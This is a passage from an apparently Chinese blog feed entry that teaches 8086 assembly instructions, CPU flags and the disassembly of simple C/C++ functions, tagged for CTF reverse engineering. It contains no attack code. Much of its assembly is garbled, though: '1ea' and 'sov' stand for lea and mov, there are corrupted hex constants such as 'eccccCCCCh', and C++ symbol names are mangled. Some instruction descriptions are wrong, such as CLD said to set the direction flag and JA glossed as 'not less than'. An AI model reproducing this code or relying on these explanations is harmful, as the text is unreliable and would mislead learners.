串传送.</span><br><span class="line">( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )</span><br><span class="line">CMPS 串比较.</span><br><span class="line">( CMPSB 比较字符. CMPSW 比较字. )</span><br><span class="line">SCAS 串扫描.</span><br><span class="line">把AL或AX的内容与目标串作比较,比较结果反映在标志位.</span><br><span class="line">LODS 装入串.</span><br><span class="line">把源串中的元素(字或字节)逐一装入AL或AX中.</span><br><span class="line">( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. )</span><br><span class="line">STOS 保存串.</span><br><span class="line">是LODS的逆过程.</span><br><span class="line">REP 当CX/ECX&lt;&gt;0时重复.，也就是直到CX=0时结束</span><br><span class="line">REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复.</span><br><span class="line">REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复.</span><br><span class="line">REPC 当CF=1且CX/ECX&lt;&gt;0时重复.</span><br><span class="line">REPNC 当CF=0且CX/ECX&lt;&gt;0时重复.</span><br></pre></td></tr></table></figure><h3 id="控制转移类指令"><a href="#控制转移类指令" class="headerlink" title="控制转移类指令"></a>控制转移类指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">JMP 无条件转移指令</span><br><span class="line">CALL 过程调用</span><br><span class="line">RET/RETF过程返回.</span><br><span class="line">条件转移：</span><br><span class="line">( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</span><br><span class="line">JA/JNBE 不小于或不等于时转移.</span><br><span class="line">JAE/JNB 大于或等于转移.</span><br><span class="line">JB/JNAE 小于转移.</span><br><span class="line">JBE/JNA 小于或等于转移.</span><br><span class="line">以上四条,测试无符号整数运算的结果(标志C和Z).</span><br><span class="line">JG/JNLE 大于转移.</span><br><span class="line">JGE/JNL 大于或等于转移.</span><br><span class="line">JL/JNGE 小于转移.</span><br><span class="line">JLE/JNG 小于或等于转移.</span><br><span class="line">以上四条,测试带符号整数运算的结果(标志S,O和Z).</span><br><span class="line">JE/JZ 等于转移.</span><br><span class="line">JNE/JNZ 不等于时转移.</span><br><span class="line">JC 有进位时转移.</span><br><span class="line">JNC 无进位时转移.</span><br><span class="line">JNO 不溢出时转移.</span><br><span class="line">JNP/JPO 奇偶性为奇数时转移.</span><br><span class="line">JNS 符号位为 &quot;0&quot; 时转移.</span><br><span class="line">JO 溢出转移.</span><br><span class="line">JP/JPE 奇偶性为偶数时转移.</span><br><span class="line">JS 符号位为 &quot;1&quot; 时转移.</span><br><span class="line">LOOP CX不为零时循环.</span><br><span class="line">LOOPE/LOOPZ CX不为零且标志Z=1时循环.</span><br><span class="line">LOOPNE/LOOPNZ CX不为零且标志Z=0时循环.</span><br><span class="line">JCXZ CX为零时转移.</span><br><span class="line">JECXZ ECX为零时转移.</span><br><span class="line">INT 中断指令</span><br><span class="line">INTO 溢出中断</span><br><span class="line">IRET 中断返回</span><br></pre></td></tr></table></figure><h3 id="处理器控制类指令"><a href="#处理器控制类指令" class="headerlink" title="处理器控制类指令"></a>处理器控制类指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CLC（进位位置0指令）</span><br><span class="line">CMC（进位位求反指令）</span><br><span class="line">STC（进位位置为1指令）</span><br><span class="line">CLD（方向标志置1指令）</span><br><span class="line">STD（方向标志位置1指令）</span><br><span class="line">CLI（中断标志置0指令）</span><br><span class="line">STI（中断标志置1指令）</span><br><span class="line">WAIT（等待）</span><br><span class="line">ESC（交权）</span><br><span class="line">LOCK（封锁总线）</span><br><span class="line">NOP（无操作）</span><br><span class="line">HLT（暂停）</span><br></pre></td></tr></table></figure><h3 id="汇编指令伪指令"><a href="#汇编指令伪指令" class="headerlink" title="汇编指令伪指令"></a>汇编指令伪指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DW 定义字(2字节).</span><br><span class="line">PROC 定义过程.</span><br><span class="line">ENDP 过程结束.</span><br><span class="line">SEGMENT 定义段.</span><br><span class="line">ASSUME 建立段寄存器寻址.</span><br><span class="line">ENDS 段结束.</span><br><span class="line">END 程序结束.</span><br></pre></td></tr></table></figure><h2 id="寄存器与标志位"><a href="#寄存器与标志位" class="headerlink" title="寄存器与标志位"></a>寄存器与标志位</h2><p><img src="/images/jichuhuibian4.png" alt><br>CF(Carry Flag)——进位标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当执行一个加法(或减法)运算，使最高位产生进位(或借位)时</span><br><span class="line">CF为1，则为0。</span><br></pre></td></tr></table></figure><p>PF(Parity Flag)——奇偶标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">该标志位反映运算结果中1的个数是偶数还是奇数。</span><br><span class="line">当指令执行结果的低8位中含有偶数个1时</span><br><span class="line">PF=1；否则PF=0。</span><br></pre></td></tr></table></figure><p>AF(Auxiliary carry Flag)——辅助进位标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当执行一个加法(或减法)运算，使结果的低4位向高4位有进位(或借位)时，</span><br><span class="line">AF=1；否则AF=0。</span><br><span class="line">ZF(Zero Flag)——零标志位。</span><br><span class="line">若当前的运算结果为零，ZF=1；否则ZF=0。</span><br></pre></td></tr></table></figure><p>SF(Sign Flag)——符号标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它和运算结果的最高位相同。</span><br></pre></td></tr></table></figure><p>OF(Overflow Flag)——溢出标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当补码运算有溢出时，OF=1；否则OF=0。</span><br></pre></td></tr></table></figure><p>3个控制标志位用来控制CPU的操作，由指令进行置位和复位。</p><p>DF(Direction Flag)——方向标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">它用以指定字符串处理时的方向，</span><br><span class="line">当该位置“1”时，字符串以递减顺序处理，即地址以从高到低顺序递减。</span><br><span class="line">反之，则以递增顺序处理。</span><br></pre></td></tr></table></figure><p>IF(Interrupt enable Flag)——中断允许标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">它用来控制8086是否允许接收外部中断请求。</span><br><span class="line">若IF=1，8086能响应外部中断，反之则不响应外部中断。</span><br><span class="line">注意：IF的状态不影响非屏蔽中断请求(NMI)和CPU内部中断请求</span><br></pre></td></tr></table></figure><p>TF(Trap Flag)——跟踪标志位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">它是为调试程序而设定的陷阱控制位。</span><br><span class="line">当该位置“1”时，8086 CPU处于单步状态，</span><br><span class="line">此时CPU每执行完一条指令就自动产生一次内部中断。</span><br><span class="line">当该位复位后，CPU恢复正常工作。</span><br></pre></td></tr></table></figure><p>edi 相当于 nop,例如 mov edi edi,之所以用 edi 不用 nop 是因为执行两个 edi 比执行两个 nop 快很多</p><hr><p>下面在具体的程序中分析汇编代码。</p><h2 id="初始化变量"><a href="#初始化变量" class="headerlink" title="初始化变量"></a>初始化变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string a #字符串变量</span><br><span class="line">int a # 整型变量</span><br><span class="line">Boolean a #布尔型变量</span><br><span class="line">char a #字符型变量</span><br><span class="line">double a #双精度变量</span><br><span class="line">float a #单精度变量</span><br><span class="line">char array a #字符型数组</span><br></pre></td></tr></table></figure><p>C代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string stringvar=&quot;Hello World&quot;；</span><br><span class="line">int intvar=100;</span><br><span class="line">bool boolvar=false;</span><br><span class="line">char charvar=&apos;B&apos;;</span><br><span class="line">double doublevar=3.1415; </span><br><span class="line">float floatvar=3.14159265;</span><br><span class="line">char carray[]=&#123;&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&quot;,&apos;e&apos;&#125;;</span><br></pre></td></tr></table></figure><p>对应的初始化汇编代码：<br><img src="/images/jichuhuibian1.png" alt><br>变量分配：<br><img src="/images/jichuhuibian2.png" alt><br>C++字符串的启动：<br><img src="/images/jichuhuibian3.png" alt><br>初始化字符串需要调用内置函数进行</p><h2 id="基本输出"><a href="#基本输出" class="headerlink" title="基本输出"></a>基本输出</h2><p>这是一段C++的输出代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">printf（&quot;Hello String Literal&quot;）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%s&quot;，stringvar）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%i&quot;，intvar）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%c&quot;，charvar）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%f&quot;，doublevar）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%f&quot;，floatvar）；</span><br><span class="line">_asm&#123;nop&#125;</span><br><span class="line">printf（&quot;%c&quot;，carrays[3]);</span><br></pre></td></tr></table></figure><p>字符串文字的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push offset aHelloStringlit;&quot;Hello String Literal&quot;</span><br><span class="line">call jprintf </span><br><span class="line">add esp,4</span><br></pre></td></tr></table></figure><p>字符串文字被压入堆栈作为printf函数的参数被调用<br>一个变量的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+intvar]</span><br><span class="line">push eax </span><br><span class="line">push offset aI_0;&quot;%i&quot;</span><br><span class="line">call jprintf </span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure><p>首先将变量intvar移入EAX寄存器，然后将其用指示整数输出的字符串文字‘’%i’一起送入堆栈中。然后将这些变量从堆栈中取出，并作为在调用printf函数时的参数。</p><h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><p>包括：</p><ul><li>加法</li><li>减法</li><li>乘法</li><li>除法</li><li>按位与</li><li>按位或</li><li>按位异或</li><li>按位非</li><li>按位右移</li><li>按位左移</li></ul><p>用这段代码时进行数学运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void mathfunctions（）</span><br><span class="line">&#123;//mathematical operations </span><br><span class="line">intA=10；</span><br><span class="line">intB=15；</span><br><span class="line">int add=A+B；</span><br><span class="line">int sub=A-B；</span><br><span class="line">int mult=A*B；</span><br><span class="line">int div=A/B；</span><br><span class="line">int and=A&amp;B；</span><br><span class="line">int or=A|B；</span><br><span class="line">int xor=AAB；</span><br><span class="line">int not=~A；</span><br><span class="line">int rshift=A&gt;&gt;B；</span><br><span class="line">int 1shift=A&lt;&lt;B；</span><br></pre></td></tr></table></figure><p>我们对每个函数分开分析。<br>首先我们将A表示为十六进制oA，表示十进制10，B表示为十六进制的oF，表示十进制的15。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [ebp+A],0Ah</span><br><span class="line">mov [ebp+B],OFh</span><br></pre></td></tr></table></figure><p>add加法汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">add eax,[ebp+B]</span><br><span class="line">mov [ebp+add], eax</span><br></pre></td></tr></table></figure><p>sub减法汇编:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">sub eax,[ebp+B]</span><br><span class="line">mov [ebp+sub],eax</span><br></pre></td></tr></table></figure><p>imul乘法汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">imul eax,[ebp+B]</span><br><span class="line">mov [ebp+mult],eax</span><br></pre></td></tr></table></figure><p>idiv除法汇编,使用’cdq’来加倍EAX的大小，以便我们可以适应除法运算的输出。：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">cdq </span><br><span class="line">idiv [ebp+B]</span><br><span class="line">mov [ebp+div],eax</span><br></pre></td></tr></table></figure><p>and按位与运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">and eax,[ebp+B]</span><br><span class="line">mov [ebp+and],eax</span><br></pre></td></tr></table></figure><p>or按位或运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">or eax,[ebp+B]</span><br><span class="line">mov [ebp+or],eax</span><br></pre></td></tr></table></figure><p>xor按位异或运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">xor eax,[ebp+B]</span><br><span class="line">mov [ebp+xor],eax</span><br></pre></td></tr></table></figure><p>not按位非运算：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">not eax </span><br><span class="line">mov [ebp+not],eax</span><br></pre></td></tr></table></figure><p>shl进行按位左移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[ebp+A]</span><br><span class="line">mov ecx,[ebp+B]</span><br><span class="line">shl eax,cl</span><br><span class="line">mov [ebp+lshift],eax</span><br></pre></td></tr></table></figure><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>3种不同类型的函数：</p><ul><li>基本的空函数</li><li>返回整数的函数</li><li>接受参数的函数</li></ul><p>分别是下面这段代码对应的三个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void newfunc()&#123;</span><br><span class="line">printf(&quot;Hello!I&apos;m a new function!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int newfuncret()&#123;</span><br><span class="line">int A=rand();</span><br><span class="line">return A;</span><br><span class="line">&#125;</span><br><span class="line">void funcparams(int iparam,string sparam,char cparam)</span><br><span class="line">&#123;// function with parameters </span><br><span class="line">printf(&quot;%i \n&quot;,iparam);</span><br><span class="line">printf(&quot;%s \n&quot;,sparam); </span><br><span class="line">printf(&quot;%c\n&quot;,cparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="基本的空函数："><a href="#基本的空函数：" class="headerlink" title="基本的空函数："></a>基本的空函数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void newfunc()&#123;</span><br><span class="line">printf(&quot;Hello!I&apos;m a new function!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call newfunc</span><br></pre></td></tr></table></figure><p>看汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">newfunc_func proc near </span><br><span class="line">var_C0=byte ptr-ec0h </span><br><span class="line">push ebp </span><br><span class="line">mov ebp, esp </span><br><span class="line">sub esp, oc0h </span><br><span class="line">push ebx</span><br><span class="line">push esi</span><br><span class="line">push edi</span><br><span class="line">1ea edi,[ ebp+var_Ce]</span><br><span class="line">mov ecx,30h </span><br><span class="line">mov eax, 0ccccccch </span><br><span class="line">rep stosd</span><br><span class="line">push offset aHelloIMANewFun;&quot;Hello!I&apos;m a new function!&quot;</span><br><span class="line">call j__printf </span><br><span class="line">add esp,4</span><br><span class="line">pop edi</span><br><span class="line">pop esi</span><br><span class="line">pop ebx</span><br><span class="line">add esp, oc0h </span><br><span class="line">cmp ebp, esp </span><br><span class="line">call j__RTC_CheckEsp; compiler security check</span><br><span class="line">mov esp, ebp </span><br><span class="line">pop ebp </span><br><span class="line">retn; return to last position, not return with item.</span><br><span class="line">newfunc_func endp</span><br></pre></td></tr></table></figure><p>这个函数使用了retn操作码，但只是返回到了上一个位置。（这样程序能够在函数调用完成后继续。）</p><h4 id="返回整数的函数"><a href="#返回整数的函数" class="headerlink" title="返回整数的函数"></a>返回整数的函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int newfuncret()&#123;//new function that returns something </span><br><span class="line">int A=rand(); </span><br><span class="line">return A;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call newfuncret</span><br></pre></td></tr></table></figure><p>汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">newfuncret_func proc near </span><br><span class="line">var_CC=byte ptr-0CCh </span><br><span class="line">A=dword ptr-8</span><br><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,0CCh </span><br><span class="line">push ebx</span><br><span class="line">push esi</span><br><span class="line">push edi</span><br><span class="line">1ea edi,[ebp+var_CC]</span><br><span class="line">mov ecx,33h </span><br><span class="line">mov eax,0CCCCCCCCh </span><br><span class="line">rep stosd </span><br><span class="line">mov esi,esp </span><br><span class="line">call ds:__imp__rand;call rand()</span><br><span class="line">cmp esi,esp </span><br><span class="line">call j__RTC_CheckEsp;compiler security check </span><br><span class="line">mov [ebp+A],eax ;set the A to result of rand()</span><br><span class="line">mov eax,[ebp+A];set EAX to A to return later </span><br><span class="line">pop edi</span><br><span class="line">pop esi</span><br><span class="line">pop ebx </span><br><span class="line">add esp,0CCh </span><br><span class="line">cmp ebp,esp </span><br><span class="line">call j__RTC_CheckEsp;compiler security check </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp</span><br><span class="line">retn;When retn is called,it returns with the value in EAX newfuncret func endp</span><br></pre></td></tr></table></figure><p>首先为A变量分配空间。然后调用rand（）函数，将其返回值放入EAX寄存器。接下来，将EAX变量移入A变量空间，将A做为rand（）的结果。最后，将A变量移入EAX，以便函数可以将其用作返回值。</p><h4 id="接受参数的函数"><a href="#接受参数的函数" class="headerlink" title="接受参数的函数"></a>接受参数的函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void funcparams(int iparam,string sparam,char cparam)</span><br><span class="line">&#123;// function with parameters </span><br><span class="line">printf(&quot;%i \n&quot;,iparam);</span><br><span class="line">printf(&quot;%s \n&quot;,sparam); </span><br><span class="line">printf(&quot;%c\n&quot;,cparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用申明:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">movzx eax,[ebp+charvar]</span><br><span class="line">push eax;cparam </span><br><span class="line">sub esp,1Ch </span><br><span class="line">mov ecx,esp ;this </span><br><span class="line">mov [ebp+var_14C],esp</span><br><span class="line">1ea edx,[ebp+stringvar]</span><br><span class="line">push edx;_Right </span><br><span class="line">call j??0$basic_stringeou?schar_traitsep@std@@V?$allocator@0@20@std@CQAE@ABve1@@Z </span><br><span class="line">mov [ebp+var_160],eax </span><br><span class="line">mov eax,[ebp+intvar]</span><br><span class="line">call funcparams</span><br></pre></td></tr></table></figure><p>先将变量放入寄存器中，然后将寄存器压入栈中，最后调用该函数。<br>函数汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">funcparams_func proc near </span><br><span class="line">var_C8=byte ptr-0c0h </span><br><span class="line">iparam=dword ptr 8</span><br><span class="line">sparam= std:：basic_string&lt;char，std:：char_traitscchar&gt;，std:：allocator&lt;char&gt;&gt;ptr </span><br><span class="line">cparam= byte ptr 28h </span><br><span class="line">mov ebp，esp </span><br><span class="line">sub esp，8c8h </span><br><span class="line">push ebx</span><br><span class="line">push esi</span><br><span class="line">push edi </span><br><span class="line">lea edi，[ebprvar_ce]</span><br><span class="line">mov ecx，30h </span><br><span class="line">sov eax，eccccCCCCh </span><br><span class="line">rep stosd </span><br><span class="line">sov eax，[ebp+iparam]</span><br><span class="line">push eax </span><br><span class="line">push offset_Format；&quot;%i\n&quot;</span><br><span class="line">call j_printf </span><br><span class="line">add esp，8</span><br><span class="line">sub esp，1Ch </span><br><span class="line">mov ecx，7</span><br><span class="line">1ea esi，[ebp+sparam]</span><br><span class="line">mov edi，esp </span><br><span class="line">rep sovsd </span><br><span class="line">push offset a5；“%s\n”</span><br><span class="line">call jprintf </span><br><span class="line">add esp，20h </span><br><span class="line">movsx eax，[ebp+cparam]</span><br><span class="line">push eax </span><br><span class="line">push offset ac；“%c\n”</span><br><span class="line">call j_printf </span><br><span class="line">add esp，8</span><br><span class="line">lea ecx，[ebp+sparam]；this cal1 j？1isbasic_stringeou？schar_traitse0gstdgv？sallocatorgog2e0stde@QAEexz </span><br><span class="line">pop edi</span><br><span class="line">pop esi</span><br><span class="line">pop ebx </span><br><span class="line">add esp，ac8h </span><br><span class="line">cmp ebp，esp </span><br><span class="line">call jRTC_CheckEsp </span><br><span class="line">mov esp，ebp </span><br><span class="line">pop ebp </span><br><span class="line">funcparams func endp</span><br></pre></td></tr></table></figure><p>这个函数是接受一个字符串，一个整数和一个字符，并使用printf打印出来。首先在函数顶部分配3个变量，然后将这些变量作为printf函数的参数压入堆栈。</p><p>参考资料：<a href="https://www.kancloud.cn/wintry/python3/742485" target="_blank" rel="noopener">https://www.kancloud.cn/wintry/python3/742485</a><br><a href="https://www.kancloud.cn/wintry/python3/742484" target="_blank" rel="noopener">https://www.kancloud.cn/wintry/python3/742484</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;8086汇编语言指令大致分为以下几类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一、传送类指令&lt;/li&gt;
&lt;li&gt;二、算数运算类指令&lt;/li&gt;
&lt;li&gt;三、位操作指令&lt;/li&gt;
&lt;li&gt;四、串操作指令&lt;/li&gt;
&lt;li&gt;五、控制转移类指令&lt;/li&gt;
&lt;li&gt;六、处理器控制类指令&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="汇编" scheme="https://kevens10.github.io/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="CTF 逆向" scheme="https://kevens10.github.io/tags/CTF-%E9%80%86%E5%90%91/"/>
    
      <category term="CTF PWN" scheme="https://kevens10.github.io/tags/CTF-PWN/"/>
    
      <category term="汇编语言" scheme="https://kevens10.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>常用的Markdown语法</title>
    <link href="https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Markdown%E8%AF%AD%E6%B3%95.html"/>
    <id>https://kevens10.github.io/articles/%E5%B8%B8%E7%94%A8%E7%9A%84Markdown%E8%AF%AD%E6%B3%95.html</id>
    <published>2019-11-18T12:48:51.000Z</published>
    <updated>2019-11-18T09:55:43.889Z</updated>
    
